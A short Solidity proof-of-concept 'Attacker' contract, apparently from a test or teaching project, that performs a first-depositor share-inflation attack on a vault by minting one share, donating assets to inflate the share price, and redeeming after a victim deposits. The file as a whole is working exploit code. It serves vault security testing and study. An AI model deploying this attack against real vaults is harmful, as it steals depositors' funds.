// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../IVault.sol";

/// First-depositor inflation: mint 1 share, donate assets directly to inflate price-per-share, then
/// (after the victim deposits) redeem for a disproportionate share. Demonstration only — local, valueless.
contract Attacker {
    IVault public immutable vault;
    IAsset public immutable asset;
    constructor(address _v, address _a) { vault = IVault(_v); asset = IAsset(_a); }
    function attackSetup(uint256 donation) external {
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1, address(this));          // mint 1 share on the empty vault
        asset.transfer(address(vault), donation);  // donate -> inflate price-per-share
    }
    function cashOut() external returns (uint256) {
        vault.redeem(vault.balanceOf(address(this)), address(this), address(this));
        return asset.balanceOf(address(this));
    }
}
